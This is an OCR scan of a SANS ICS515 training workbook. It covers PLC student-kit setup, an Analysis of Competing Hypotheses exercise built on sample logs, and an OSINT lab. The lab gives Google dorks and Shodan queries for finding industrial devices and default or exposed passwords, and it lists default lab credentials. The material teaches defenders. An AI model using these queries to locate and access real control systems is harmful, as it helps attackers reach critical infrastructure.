PP» FW WD WD Ww wh Ww ew lw lel lk lw OleOle lle

we

ICS515 | ICS VISIBILITY, DETECTION, AND RESPONSE
GIAC Response and Industrial Defense (GRID)

Workbook

GIAC

CERTIFICATIONS

NANS

THE MOST TRUSTED SOURCE FOR INFORMATION SECURITY TRAINING, CERTIFICATION, AND RESEARCH | sans.org

Free Cybersecurity Resources

sans.org/free

SANS instructors and analysts produce thousands of free resources and tools for the
cybersecurity community, including more than 150 free tools and hundreds of white papers

authored annually. SANS remains committed to providing free education and capabilities to the

cyber communities we serve, train, and certify.

Free Cybersecurity Community Resources

Internet Storm Center — Free Analysis and Warning Service

White Papers - Community InfoSec Research

Blog - Cybersecurity Blog

Newsletters - Newsbites; @Risk; OUCH!

Webcasts - Live and Archived

S0O@Oo®

Posters — Job-Focused Resources

=]) SANS Holiday Hack Challenge
= Critical Security Controls - Recommended Actions for

Cyber Defense

S Free Tools — SANS Instructors have built more than
150 open-source tools that support your work and help
you implement better security

ee a (ie)
(©) (fon) ( £5)
(©) oy) Gp)

Join the SANS alumni community online

“As usual, SANS courses pay
for themselves by Day 2.

By Day 3, you are itching to
get back to the office to use
what you've learned.”

en Evans, Hewlett Packard
Enterprise -

Digital Investigation Services

Free Training and Events
> Test Drive 45+ SANS Courses

>» Free SANS Summits & Forums

» Capture-the-Flag Cyber
Challenges

» Cyber Aces

GIAC

CERTIFICATIONS

NANS

Www.sans.org

Vm
AY UU

1CS515 | ICS VISIBILITY, DETECTION, AND RESPONSE
GIAC Response and Industrial Defense (GRID)

Workbook

GIAC

CERTIFICATIONS

NANS

THE MOST TRUSTED SOURCE FOR INFORMATION SECURITY TRAINING, CERTIFICATION, AND RESEARCH | sans.org

NON phyfyjy mt

1CS515 | ICS VISIBILITY, DETECTION, AND RESPONSE
GIAC Response and Industrial Defense (GRID)

Workbook

GIAC

CERTIFICATIONS

SANS

THE MOST TRUSTED SOURCE FOR INFORMATION SECURITY TRAINING, CERTIFICATION, AND RESEARCH | sans.org

© 2021 Robert M. Lee. Alll rights reserved to Robert M. Lee and/or SANS Institute.

PLEASE READ THE TERMS AND CONDITIONS OF THIS COURSEWARE LICENSE AGREEMENT
"CLA") CAREFULLY BEFORE USING ANY OF THE COURSEWARE ASSOCIATED WITH THE SANS
COURSE. THIS IS A LEGAL AND ENFORCEABLE CONTRACT BETWEEN YOU (THE “USER’) AND
SANS INSTITUTE FOR THE COURSEWARE. YOU AGREE THAT THIS AGREEMENT IS
ENFORCEABLE LIKE ANY WRITTEN NEGOTIATED AGREEMENT SIGNED BY YOU.

With this CLA, SANS Institute hereby grants User a personal, non-exclusive license to use the Courseware
subject to the terms of this agreement. Courseware includes all printed materials, including course books
and lab workbooks, as well as any digital or other media, virtual machines, and/or data sets distributed by
SANS Institute to User for use in the SANS class associated with the Courseware. User agrees that the
CLA is the complete and exclusive statement of agreement between SANS Institute and you and that this
CLA supersedes any oral or written proposal, agreement or other communication relating to the subject
matter of this CLA.

BY ACCEPTING THIS COURSEWARE, USER AGREES TO BE BOUND BY THE TERMS OF THIS CLA.
BY ACCEPTING THIS SOFTWARE, USER AGREES THAT ANY BREACH OF THE TERMS OF THIS CLA
MAY CAUSE IRREPARABLE HARM AND SIGNIFICANT INJURY TO SANS INSTITUTE, AND THAT
SANS INSTITUTE MAY ENFORCE THESE PROVISIONS BY INJUNCTION (WITHOUT THE
NECESSITY OF POSTING BOND) SPECIFIC PERFORMANCE, OR OTHER EQUITABLE RELIEF.

If User does not agree, User may return the Courseware to SANS Institute for a full refund, if applicable.

User may not copy, reproduce, re-publish, distribute, display, modify or create derivative works based upon
all or any portion of the Courseware, in any medium whether printed, electronic or otherwise, for any
purpose, without the express prior written consent of SANS Institute. Additionally, User may not sell, rent,
lease, trade, or otherwise transfer the Courseware in any way, shape, or form without the express written
consent of SANS Institute.

If any provision of this CLA is declared unenforceable in any jurisdiction, then such provision shall be
deemed to be severable from this CLA and shall not affect the remainder thereof. An amendment or
addendum to this CLA may accompany this Courseware.

SANS acknowledges that any and all software and/or tools, graphics, images, tables, charts or graphs
presented in this Courseware are the sole property of their respective trademark/registered/copyright
owners, including:

AirDrop, AirPort, AirPort Time Capsule, Apple, Apple Remote Desktop, Apple TV, App Nap, Back to My
Mac, Boot Camp, Cocoa, FaceTime, FileVault, Finder, FireWire, FireWire logo, iCal, iChat, iLife, iMac,
iMessage, iPad, iPad Air, iPad Mini, iPhone, iPhoto, iPod, iPod classic, iPod shuffle, iPod nano, iPod touch,
iTunes, iTunes logo, iWork, Keychain, Keynote, Mac, Mac Logo, MacBook, MacBook Air, MacBook Pro,
Macintosh, Mac OS, Mac Pro, Numbers, OS X, Pages, Passbook, Retina, Safari, Siri, Spaces, Spotlight,
There’s an app for that, Time Capsule, Time Machine, Touch ID, Xcode, Xserve, App Store, and iCloud are
registered trademarks of Apple Inc.

PMP® and PMBOK® are registered trademarks of PMI.

SOF-ELK@ is a registered trademark of Lewes Technology Consulting, LLC. Used with permission.

SIFT@ is a registered trademark of Harbingers, LLC. Used with permission.

Governing Law: This Agreement shall be governed by the laws of the State of Maryland, USA.

ICS515_W_G01_09
wwe Ww

|

Ww & WwW WS WS WwW W

we we w&

ww wow Ww we ww

Objectives

Prepare for class labs
Register needed accounts

Task — Prepare for the Class Labs :

Transfer the Class Files to Your Computer
> You are provided a download link in your SANS portal to the course media files
> There is a zip folder in the course media files, transfer it to your host system
Extract the Contents of the Zip File
> Unarchive the contents of the zip file onto your host system
i. You can choose any location you want such as the Desktop
Install VMWare Player
> You can either use your own professional version or install a trial version from their website
e You do not need the paid version to complete the course
> Windows users will utilize VMWare Player and Mac users will utilize VMWare Fusion
Load the Virtual Machines
> Once the data is extracted load the Windows Virtual Machine and the RELICS Virtual Machine to
ensure virtualization works on your workstation
i. If you have any errors that you cannot troubleshoot ask your instructor (live class) or
OnDemand contact. Common issues include not having extracted the files and trying to
run the VM from inside the zip file or not having virtualization enabled on the host
system which requires a modification in the BIOS. This is dependent on your host system
> Once you have verified that the Virtual Machines have launched you are done; you do not need
to login or continue, this is just a check to ensure that virtualization works for you and you are
ready to proceed with the labs
> If you wish to log in to the VMs the credentials are:
Windows VM
e Username = sansics
e Password = sansics
RELICS VM
e Username = relics
e Password = relics

© 2021, Robert M. Lee LabO-1
vw WV wo oY we ew ew

wv ww WY Ww WW

ws we ww we Ww

)

is

a3

Objectives

e Build the SANS515 Student Kit (PLC)
e Load the hardware test configuration logic onto the PLC

*Scenario Information* In the context of the Day 1-5 scenario, the PLC and its accompanying network that
you will have physical access to is the Calistoga Power Operations covering Power Generation, Power
Transmission, and Power Distribution. Technically that makes it 3 power operations so for brevity we’ll refer to
Calistoga 3 Power Operations (C3PO).

Note: The configuration for the Virtual Machine (VM) network settings is critical for the lab’s success and is
a common troubleshooting issue for students. Verify the IP address range and ensure the VM Network
Interface Card (NIC) is in Bridge mode when prompted to in the lab walkthrough. The below are common

troubleshooting paths to consider if you run into issues. Follow the walkthrough and revert back to these if
needed.

General troubleshooting paths:

1. Ensure that in the Click software that the Port type is Ethernet

2. Ensure VM Settings are in Bridged Mode

3. Ensure when the kit is connected it is connected to your Host machine (not VM)

4. In rare cases the anti-virus software on your host may need to be disabled or whitelist applications

5. If Bridge connectivity is not working connect to the VM instead and change the Windows IP address
to 169.254.x.x/16 range

6. If the PLC has a red “err” light on it — disconnect then reconnect the power to the PLC

7. In some cases, switching USB ports on a machine allows functionality as expected for kit connectivity

8. In VMWare Workstation Pro 16 the Automatic Bridging Settings needs to be configured. In Player
you see “Configure Adapters” directly in the VM Settings. In Pro it is under a dedicated global setting
under Edit > Virtual Network Editor > Change Settings > Automatic Settings

9. Change the network from Bridge to NAT and back to Bridge (helps with possible VM glitches)

10. Restart the kit, restart the VM, ensure the PLC is set to run, and then ask an instructor for help

This exercise will utilize the Windows VM and the SANS ICS515 Student Kit.

© 2021, Robert M. Lee Lab 1.1-1
1. What does Sim switch 2 alter when the Logic is loaded to the Programmable Logic Controller (PLC)?

Task — Build the SANS515 Student Kit (PLC)

*Note* First unpack all of the materials.

> Your student kit contains:
CLICK PLC Pro with C2-O8DR-6V Module
CLICK Input / Output card CO-O8CDR
CLICK Simulation card CO-O8SIM
SANS 1CS515 printed circuit board
1ft Ethernet cable
USB to Ethernet adapter
Three terminal block wire harnesses
International power supply
> After you have removed all of the elements from the student kit box, please save the box as you may
need it for storing or shipping your student kit in the future.
> Connect the Process Input / Output wiring
>» The student kit board contains four connection points on the top of the board

VVVVVVVV

> Three terminal block wire harnesses have been provided with the student kit that connect to
the four connection points on the circuit board

© 2021, Robert M. Lee Lab 1.1-2

oud bbb wb wb &

uw Ww

vu bv vb &

vu J Jv VY WY

ua

i. Connect the four wire connectors to their locations on the student boards
ii. Each connector only fits in one place on the board and in one direction
iii. Connect the terminal blocks to the CLICK PLC modules
iv. Each terminal block only fits in one place on the PLC modules
** Ensure the three terminal blocks are pushed all the way into the PLC

iv
v.
ee

ee

> Connect the power
> Unpack the universal power supply
> Slide on the appropriate power adapter based on the region you are in and plug into an
appropriate power source
> Connect the power to the power module on the top right corner of the student kit board

© 2021, Robert M. Lee Lab 1.1-3
Ss ses 8s» & 8 @2 @ @ @ dD O@ DD OO OD OO 8 DD DB DB HB BD H wB

4

Lab 1.1 -—

© 2021, Robert M. Lee

The board should power up and look like the image above.

>
vw vw wwe we He we ee we we

Task — Connect to the PLC and Load Hardware Validation Logic

> Connect the ICS515 Student Kit (Kit) to your laptop
> Locate the USB to Ethernet adapter (atolla adapter provided in the student kit)
> Locate the 3ft ethernet cable provided in the student kit.
> Connect the Ethernet cable to USB adapter and the CLICK Ethernet interface
> Connect the USB cable that attaches the Kit to your laptop (USB C adapter has been provided)

*Note* The VM network settings for the course will require a physical network connection from the host
workstation to the PLC and the Virtual machines will both be set in Bridge mode to utilize a common physical
connection from the host. If prompted when you connect the USB to Ethernet adapter you should always
connect to Host (not the VM). We also edit the bridge connection settings to ensure the VM does not try to
utilize a different adapter when attempting to communicate with the PLC.

Launch VMWare Player

Select the Win VM and then edit the virtual machine settings

Ensure the VM Network Adapter is in Bridged mode and select the “configure adapters” option to
select the correct network adapter.

Select Yes on the UAC prompt

Vv VVV

User Account Control

Do you want to allow this app to make
changes to your device?

This VMware product requires administrator
privilege. If you click Cancel, the application
will have limited functionality.

Verified publisher: VMware, Inc.
File origin: Hard drive on this computer

Show more details

> Uncheck all interfaces, except the ASIX interface.
> When complete select OK

© 2021, Robert M. Lee Lab 1.1-5
Summary ~ - Device status
46GB | lv] Connected
{Processors 2 | connect at power on
E)Hard Disk (SCST) 100 GB |
©) CD/DVD (SATA) Auto datect | Network connection
"2 Network Adapter Bridged (Automatic) | @bridged: Connected directly to the physical network
= |
(use Controller Present | Replicate physical network connection state
) Sound Card Auto detect
Present | Configure Adapters
Auto detect NAT: Used to share the host's IP address
| Qhost-only: A private network shared with the host
LO Octo: Sari virtual notore
| Automatic Bridging Settings x Ee
i | Select the host network adapter(s) you want to automatically bridge:
| [ASI AX88179 USB 3.0 to Gigabit Ethernet Adapter 3 t
| [J Microsoft Wi-Fi Direct Virtual Adapter #2
| Microsoft Wi-Fi Direct Virtual Adapter LAN Seaments...] [Advanced

|

|

Killer(R) Wi-Fi 6 AX16S0w 160MHz Wireless Network Adapter (20002W)
| {_]killer €3100x 2.5 Gigabit Ethernet Controller (2)

Bluetooth Device (Personal Area Network)

Cancel Help

*Note* The steps to add and configure the USB adapter to your host and setup VM bridging will vary if you are
using VM Workstation Professional or VM Fusion. The steps provided in this lab are specific to VM Player.

> Start the ICS515 Windows VM, if prompted to download VM tools select “remind me later”
> Login to the Windows VM machine

> LOGIN =sansics

> PASSWORD = sansics

> Load a hardware validation logic file into the PLC
> Locate the Student File — “ICS515 Mfg V3 for Production Boards.ckp”

© 2021, Robert M. Lee Lab 1.1-6

uwdedds wb ww

oe ww wu Ww

wow

Se we & ww W@W VU Ww W

Share View

> Student Files

Name
st Quick access
Bl Desktop * ICS515 Mfg V3 for Production Boards.ckp
ICS515 OEM Change V2.ckp
& Downloads ”
= ICS515 Site Acceptance Test V1.ckp

> Double click the file and it will launch the CLICK programming software package

CLICK Programming Software (Version 201) - ICS515V8 for Production Boards.ckp ~ [Main Program] -

Program Function PLC
{ Bey PemoteCommwt » Cale
1 transalarms Initialize

Sy Transmission ‘A Contact (NC)
Sey Transtates

i Call “(Bl Edge Contact
— Ben
of Edit Rung Comments can :

Ld Local Program infor ery Generation
Syntax Check

| 8B Cross Reference View Call

= Monitor ——— Gen_Fuel_Controt

|| BR Status Monitor
| og Data View

TBrosting point Me Diet Alasci

> When the application opens, find in the top menu the icon with the Red Down arrow that is used to

Write a project into a PLC

Write Project into PLC (Shift+F9)

Pius hc, AMOR AKIE 8)

© 2021, Robert M. Lee Lab 1.1-7
> Aconnection screen will appear, you may need to select Ethernet in the Port Type drop down and
you may need to select the appropriate network adapter under the Network Adapter drop down.
The adapter may appear as an Intel network adapter due to the bridge configuration in the VM
settings.

> You should see a PLC that has been discovered.

> Click the Connect button
Troubleshooting Note: With some student workstation configurations we have observed a need to
change your Windows VM adapter IP address to align with the default DHCP range of the Click.
Setting the Windows VM adapter temporarily to the same 169.254 range, writing the logic to the
PLC, and then reverting back to a setting of 192.168.0.8.

|Connect to CLICK PLC x

Direct connection
Location of the target CLICK PLC

Port Type: Ethernet a
@ In the same LAN (Scan all CLICK PLCs in the LAN automatically,
= ior ba same LAN (Scan n automatically.)
) and a
pres See yes “rs Re C9) Qutside this LAN (You need to allocate IP address and port number manually.)
Lech PLC Name IP Address Subnet Mask PartNumber Firmware Mode = Status Mac Address
et rcoieeg? isagatons Ps h499,254,39.254 1255.255.0.0 | ver3.00

Subnet Mask: 255.255.255.0
Default Gateway: 192. 168.0.10

Refresh Blink RUN & ERR LEDs Edit...

> You may be prompted to provide an authentication password. For a completely clean PLC you will
enter “click” for the password. For a PLC that has been initialized during the SANS student kit build
process you may need to enter “sansics123”

Login x Login x
Please Enter User Name and Password, Please Enter User Name and Password.
eae Ss
User Name: | adel eee |
Password: | sansics 123. rs
M View Password
Factory Default Password = “dick” Factory Default Password = “dick”
Failed login attempt : 1 of 3
Forgot Password? Forgot Password?

ET] fea [oc coreet

> With the correct password entered, the process of writing the project to the PLC will begin. You
will be prompted to Write the project. If asked to perform a Run Time edit, you can select Yes, or
you can turn the switch on your CLICK PLC to Stop and then Select Ok.

© 2021, Robert M. Lee Lab 1.1-8
4B we wa ww

“Bs 4B’

“s is’

oe we w ww

Write Project into PLC

Pc—

Project Name: {ICS515 Mfg V3 for Producton Boards |
Program Size (Total: 8,000 steps)

WiProgram Size: 26Ssteps( 3.31 %)
GiFree Area: 7,735 steps ( 96.69 %)

0 8,000 |

| (Project File (Total: 262, 144 bytes) 1

GiProject File Size 17,372bytes( 6.62 %)
GiFree Area: 244,772 bytes ( 93.38 %) |
| i ee
Q 262,144 |
Last Update: Jul 07,2021, 19:06:00
write Project File into PLC

By enabling this option, the project file will be
downloaded(Write) into the PLC. If you want to disable
project upload(Read), disable this option.

> When the project write has been completed, you may be notified that communication has been
lost. This is due to the change in the PLC IP address. The address for the PLC was set when the

Last Update: ee ney cee etn

PLC

cPUType: §—[C2-01CPU

ProjectName: [ me

Program Size (Total: 8,000 steps)

WliProgram Size: Osteps( 0.00 %)
UiFree Area: 8,000 steps ( 100.00 %)

0 8,000

Project File (Total: 262, 144 bytes)

The Project file was not
downloaded into this CPU module.

RUN Time Edit

This CPU module doesn't support the RUN time edit.

logic was loaded onto the PLC. Simply select Reconnect.

CLICK Programming Software

: The programming session to the PLC was
!\ disconnected. Please Reconnect or choose

to Work Offline.

© 2021, Robert M. Lee

Lab 1.1-9
Task — Verify Hardware Elements

What does Sim switch 2 alter when the Logic is loaded to the Programmable Logic Controller (PLC)?

the intertie

Put the PLC switch to Run
With the Hardware validation logic loaded into the PLC, test each element.

Starting from the upper left Generation quadrant of the circuit board:
> Push the Open Switchyard breaker button — this should test the Close indicator
> Push the Close Switchyard breaker button — this should test the Intertie indicator

Move to the upper right Transmission quadrant of the circuit board:
> Push the Open breaker button — this should test the Close indicator
> Push the Close breaker button — this should test the Protection Relay Reset indicator
> Push the Protection Relay Fault button — this should test the top residential service region
indicator
> Push the Protection Relay Reset button — this should test the middle residential service region
indicator

Move to the lower right Distribution quadrant of the circuit board:
> Push the Reclosure Open button — this should test the bottom residential service region
indicator
> Push the Reclosure Close button — this should test the Industrial customer service status
indicator
> Turn the Distribution Potentiometer — this should increase the power generation MW output
indicator. Turn all the way to the max

Move to the lower left Industry quadrant of the circuit board:
> Turn the Industry Potentiometer — this should increase the seven segment display to a value.
Turn all the way to the max

At this point all indicators on the board should be green and the MW output indicator should be lit
and the seven segment display should show a value

We are now going to test each switch on the PLC Simulation module

Turn switch 1 to the right — Switchyard breaker should be Red and Closed

Turn switch 2 to the right — Intertie indicator should be Red

Turn switch 3 to the right — Transmission breaker should be Red and Closed

Turn switch 4 to the right — Protection Relay should be Red and Reset

Turn switch 5 to the right — Top residential service region indicator should light
Turn switch 6 to the right — Middle residential service region indicator should light
Turn switch 7 to the right — Bottom residential service region indicator should light
Turn switch 8 to the right — Industry service status should light

VVVVVVVV

© 2021, Robert M. Lee Lab 1.1-10

ra] co ra]

oo
uwwnwwHwwo oO

wwwu

Exercise Takeaways

The purpose of this exercise was to build the ICS515 student kit that will be used for a number of the labs
throughout the ICS515 course. Another purpose was to familiarize students with the basics of a controller by
showing how logic files get loaded to a device and how they can be interacted with through the Engineering
Software.

You can close any open applications and open file explorer windows inside the ICS 515 Windows VM and then
you can shutdown the Windows VM.

© 2021, Robert M. Lee Lab 1.1-11
we FF 8 8 wo ww © Ww wD Ww wo Ww

ww ww

‘=

_

___Lab 1.2 — Structured Analytical Techniques _

e Leverage one of the most common Structured Analytical Techniques - ACH

*Scenario Information* In the context of the Day 1-5 scenarios, participants are taking the role of a threat
intelligence analyst to identify what type of information is available publicly about their organization. This will
be used in conjunction with other network data and leveraged with Analysis of Competing Hypotheses (ACH).
The purpose of this lab is to exercise the analytical mind using ACH.

Exercise Prep

This exercise does not require any preparation, nor does it use any VMs or lab data.

Task — Analyze Data from Network Data and the ICS Honeypot

*Note* The course scenario takes place in the city of Calistoga with various industrial operations. However, we
have not gotten into the oil refinery network or electric power networks yet. This lab is going to use the Traffic
Lights network for the municipal control in the city. This network will not be part of the broader scenario but is
useful to start with for this exercise.

> Network Map: This is a view of the known network, the ICS515 scenario networks are at other
facilities.

© 2021, Robert M. Lee Lab 1.2- 1
\mr

‘a7

‘ar

et rennin eeeennnennenrninninemnn
{/

hoe
. ny ae Sarees
_— e ~ ~—
_" ae” hs :
ea za | > et
Business Windows 7 Domain Windows7
Honeypot User Controller User

ICS 515 Lab Network

ics Trafficlight Trafficlight Traffictight + TrafficLight Data Historian
Honeypot RTU TU RT RTu

*Note* Below are system events observed in the Business and ICS networks. 192.168.10.0/24 addresses are the
Business network and 10.10.10.0/24 are the ICS network assets. Information is available to you taken out of
the proper formats (example: Syslog will be more human readable) and has been stored in the Network
Security Monitoring analysts’ database. You are asked to review the data, which is normally Network Security
Monitoring's responsibility, because the Threat and Environment Manipulation team analyzed a piece of
malware in the wild (not found on the network so far) that attempts to access accounts and is specifically
targeting ICS environments. They believe it could be on the network, but the Network Security Monitoring
personnel believe there are no signs of the malware. Instead, they believe that there is likely an insider threat.
You have been asked to correlate the data and make an unbiased conclusion on one of those theories or
alternative theories to help guide the ongoing search behind the abnormal data.

1. System Level Failed Logins

e December 1 08:30:10 'Windows 7 User': Jeff ACCESS REFUSED

e December 1 08:30:32 'Windows 7 User': Jeff ACCESS REFUSED

e December 3 08:45:32 'Windows 7 User': Jeff ACCESS REFUSED

e December 8 01:01:11 'Domain Controller: Dan ACCESS REFUSED
e December 8 01:01:16 'Domain Controller: Dan ACCESS REFUSED
e December 8 01:01:21 'Domain Controller: Dan ACCESS REFUSED
e December 8 01:01:26 'Domain Controller: Dan ACCESS REFUSED
e December 8 02:02:22 'ICS Honeypot': Admin ACCESS REFUSED

e December 20 10:20:13 'Business Honeypot': Admin ACCESS REFUSED
e December 20 10:22:40 'Windows 7 User': Jeff ACCESS REFUSED
e December 20 11:14:58 'ICS Honeypot': Admin ACCESS REFUSED

© 2021, Robert M. Lee Lab 1.2- 2

lm

ew eo

2. Network Intrusion Detection System Alerts

December 1 12:30:20 SEXTERNAL -> Windows 7 User

Message: Attempt to Access Port 22

December 3 12:20:42 SBusiness -> Data Historian

Message: Flow Established Port 5450

December 8 00:20:55 SEXTERNAL -> SBusiness

Message: Network Scanning on Port 22, Port 88, and Port 135
December 8 02:02:22 SEXTERNAL -> ICS Honeypot

Message: Alerted on Any IP Communication to Honeypot — Port 502
December 8 02:02:27 SEXTERNAL -> ICS Honeypot

Message: Alerted on Any IP Communication to Honeypot — Port 502
December 20 10:20:13 SEXTERNAL -> Business Honeypot

Message: Alerted on Any IP Communication to Honeypot — Port 22
December 20 11:14:58 SBusiness -> ICS Honeypot

Message: Alerted.on Any IP Communication to Honeypot — Port 22

> From the information above, think of questions you would want to ask those managing the
architecture or those performing network security monitoring (who established the rules).
> What at this point is one theory you have:

© 2021, Robert M. Lee

Lab 1.2- 3
Task - Choose the Most Likely Scenario

*Note* Those managing the architecture and those performing network security monitoring have provided
additional information.

e Normal business hours are 8 a.m. —5 p.m.; however, there is one individual
present at all times, so odd hour communications may exist

e The IDS alerts in the ICS environment are configured to alert any time that
someone accesses the honeypot or the Data Historian; however, external Data
Historian connections are allowed. This is simply done for record keeping

e The user Dan was fired on December 15 for continuously failing company security
and compliance checks, including downloading unauthorized software

e There are no IDS rules for accessing any other ICS devices

1. Using the available information and the alerts that related to the network and honeypot, fill in the
Analysis of Competing Hypotheses Matrix with the possible scenarios and the most likely scenario.
The one sample column and two sample rows are filled out to assist getting started.

The Malware is_ | An Insider
on the Network | Threat is
Present
Port TCP 502 IDS rule fired in
the honeypot network
© 2021, Robert M. Lee Lab 1.2- 4

ae ae @ >

ae

(FF)

Dll
es ee! De! OO 2

bs 'V S&S Se ww Ww

oo FF ww Ww

Exercise Takeaways

It is difficult to come to any given conclusion with complete certainty. ACH is historically analysis driven, and it
works best when good hypotheses are put into competition with each other—regardless of what the data
supports. The data then should validate the theories and help analysts choose the best hypothesis. Honeypots
on a network can help make sense of data sets because there should be considerably less, if any, activity
directed at them. In this exercise, it was possible to make good logical conclusions and hypotheses that would
support the presence of the malware, the lack of malware, an insider threat, a fumbling admin, and any other
number of hypotheses. It’s important to know that honeypots can help support conclusions and that ACH is a
powerful tool that analysts should become familiar with. Ultimately, threat intelligence consumption
personnel will sometimes have to make analysis judgments between competing evidence (such as the
Network Security Monitoring not finding a threat but the Threat and Environment Manipulation folks feeling
strongly that one is possible). This is not due to their role in either one of those processes, but their ability to
provide impartial perspectives with strong analysis skills.

© 2021, Robert M. Lee Lab 1.2- 5
wo w Ww

wv we wo uw w

Py

we © oO WwW ww Y

VY

Objectives —- Minimum Lab Time ~35 Minutes

e __ Familiarization with Shodan and Google Hacking Queries
e Identify Information About Your Organization

*Scenario Information* In the context of the Day 1 — 4 scenarios, participants are taking the role of a threat
intelligence analyst to identify what type of information is available publicly about their organization. This
exercise will demonstrate the type of information available to an adversary. This information could be used by
defenders to reduce their information attack surface or introduce new monitoring techniques on vulnerable
information and surfaces. ICS410 taught the fundamentals of Shodan, but this exercise should be used to
attempt more advanced search queries and specifically focus on what an attacker would use against you.

Exercise Prep

This exercise will utilize an Internet connection and browser on your computer (it is recommended to use your
host computer instead of a VM as the Windows VM is set to use the bridged local network and we have not
yet reviewed the network settings within the RELICS VM).

Task — Familiarization with Shodan and Google Hacking Queries

*Note* We are going to search for some types of data that attackers might search for. Major ICS vendors are
going to be used as an example, but nothing is inherently bad about the information and it is not a
vulnerability. However, this is the type of information that adversaries might be interested in. All ICS vendors
and most organizations have similar information available online.

>  Onyour computer, open a web browser of your choice that has an active Internet connection

> You should have a Shodan account from Lab 0
*Note* Now we will explore some Google queries to show what type of information can be gathered with
them.

> Navigate to Google.com

*Note* Google allows operators to be used to tailor search options. Below we will try a few. For a good list (the
link is Case Sensitive) see: https://www.sans.org/security-resources/GoogleCheatSheet.pdf

*Note* The below walkthrough was what was returned when the course author ran the commands.
Because of the nature of open source information, the queries may no longer return the same results. Use
the below information as a sample of what you should do, but if you get different information keep
proceeding.

© 2021, Robert M. Lee Lab 1.3-1
> Search for default passwords in ICS devices of a vendor of your choice
> E.g. In the Google bar, search for: “default password” inurl:siemens filetype:pdf
o The “inurl” ensures that the search term is in the URL returned in the search. Quotes
around words ensure that all words within the quote are present and in that order. Filetype
designates a file type for the files returned such as PDF, Doc, and PPT.

Go gle "default password" inurl:siemens filetype:pdf ‘ke

> Identify interesting documents that may be of value for adversaries
> E.g. The search above returns documents for systems such as the SIMATIC HMI WinCC

POFIReadme - Siemens Industry Online Support —
support.automation.siemens.com/dnl/zy/zY 1MZMZAAAA.../ReadMe. pdf +
For the Sm@rtServer and for the integrated Web server, the default password is “100°

The user password "400" is set by default for the “Administrator”.

> — Identify the information of value in the document
> E.g. Ctrl-F brings up the search bar where you can type your search, such as “default password”

| default password —- Totaly
}
Security information |
t
|
Safe operation of a plant |
To ensure safe operation of a plant, you have to take suitable security measures that also
include IT security (e.9. network segmentation). More information on Industrial Security is
available on the Internet (www.siemens.com/industrialsecurity). |
Various passwords are set by default in WinCC. For security reasons, you should change
these passwords. |
* For the Sm@riServer and for the integrated Web server, the default password is "100" I
© The user password "100" is set by default for the “Administrator”. |
ss

> Try another search for announcements attackers might be interested in
> E.g. Search for: “contract awarded” “scada’” filetype:doc
o Adversaries often try to take advantage of changes in infrastructure, additional contractors
on-site, or announcements of new systems of interest to guide exploitation goals

Go O gle “contract awarded” "scada" filetype:doc u a) |

> Identify interesting documents and the information they present adversaries
> E.g. The first document returned when this search was initiated is about an Invesys SCADA system
and expansion of a gas plant

© 2021, Robert M. Lee Lab 1.3-2

ee ® & @® oe.

@
vouvuvuvewvewsewwseweweteew

oe wT wT Ww

0 The information has been blacked out for the privacy of the individuals and site, but this
entirely acceptable press information can be used to identify sites that are expanding and
may present an adversary a good target. More importantly, they give site names, email
addresses, and more types of information that can be used to perform follow-on queries or
target specific people with spear-phishing emails.

o The announcement displayed is from 2006. Google allows you to modify the time range
under “Search tools” to set a custom range, such as searching for only recent information
indexed by the search engine.

invensySe

press information

Invensys to implement SCADA system for major
expansion at S98 gas plant in U.A.E.

New digital monitoring and control, HMI solutions, and services to support
expansion in Onshore Gas Development Phase ili (OGD-ill) project

> — Return to Shodan and log in

> Search for devices of interest that are connected to the Internet and indexed by Shodan
> E.g. In the search bar, search for: modbus port:502 country:us
o Shodan has advanced filters much like Google

% SHODAN Explore Downloads Pricing & modbus port:502 country:us| i

> — Click on the IP address of an interesting device
> E.g. The first device returned was clicked on and displayed below

o Shodan records its searches but note that all of these are previously done—your searches
do not encourage more activity by Shodan (i.e. what is known is already known and you do
not influence that)

o Alot of information is indexed such as the IP address, location, the type of device, and even
information returned by the device when it was interacted with such as shown below
(identifying information has been blacked out)

as i & is ip ws |

“ap

© 2021, Robert M. Lee Lab 1.3-3
Host Profile:
ne United States
Latitude/ Longitude

Unit ID: 255
dentification: Modbus/TCP to RTU Bridge Bridge V3.3.25.0RC$

-- Device I

| None | Modbus TCP to RTU Bridge

Software version V'3.3.25.0RCS (140113)

Press Enter for Setup Mode

*Note* A significant portion of Shodan is based on banner grabbing. This means that when a device has a
banner when you interact with it, such as a GE CIMPLICITY server having “CIMPLICITY-HttpSvr/1.0” in its
banner, you can search for the banner in Shodan. This allows more tailored queries and does not limit the
interaction simply to protocols or vendor names.

> Perform more advanced queries to find assets beyond simple vendor or protocol names
> Example queries (Credit: Eireann Leverett’s “Quantitatively Assessing and Visualizing Industrial
System Attack Surfaces” thesis paper):
i. CIMPLICITY-HttpSvr/1.0
ii. WindRiver-WebServer/4.4
iii. Modicon+M340+CPU

© 2021, Robert M. Lee Lab 1.3-4

=

oo 2 o~,

Py fF ff 2 ff ff 2 2 2 2

?

 ]
ov wedded dbuoewktiwutbwwswwsw

ws ul ww

eo we wh

*Note* You can combine search terms with fields that may appear in the banner, such as “password”.
Additionally, you can use the "-” to remove words or “+” to ensure that a word is there. For example, Internet-
connected Lantronix devices (serial-to-Ethernet gateways) display “secured” in Shodan when the password
isn’t being broadcast by the device.

> Perform a search for insecure Lantronix devices
> Type the following into the Shodan search bar:
lantronix password —secured

fantronix password -secured Q Explore Downloads Reports Enterprise

* Exploits % Maps © ‘® Share Search. :

‘

@% SHODAN

| st Download Results | lul Create Report

TOP COUNTRIES

_ oe a 173.26

y ; _ Lantronix
, FG Mediacom Cable : _
», gre re . 5.2 _— - Password: soos
@ United States, Theodore

Details

United States , esa2 165.123

d cry Lantronix

Canada 1,300 iversi i

University of Penneyivania : Password: ALD1
Hungary 358 ae bet agian "*

. SE United States, Philadelphia

Czech Republic 182 ;

Details
Belgium 151

> Perform searches against your own infrastructure or organization to reveal issues that may need to
be addressed after class. Sample filters that may be useful:

City: search for devices in a specific city (E.g. Simatic city: Washington DC)

Country: search for devices in a specific country (E.g. CIMPLICITY country:US)

Net: search for devices at a specific IP or CIDR range (E.g. Modbus net:210.10.10.0/24)

Port: search for devices with specific ports open (E.g. Modbus port:502)

Geo: search for devices at specific geocoordinates (E.g. EthernetIP geo:50.2222, -50.2222)

After/Before: search for devices in a time range (E.g. Modbus after:1/01/2016)

VVVVVV

*Note* You can combine search filters together for complex searches.

[Task — Save Your API Key

In the upper right, click the “Account” button
Copy the api key associated with your account
Save your api key to a document on your desktop for use in a later lab

Additionally, save an IP address of an interesting ICS device that showed up in one of your queries for
use in a later lab

VVV WV

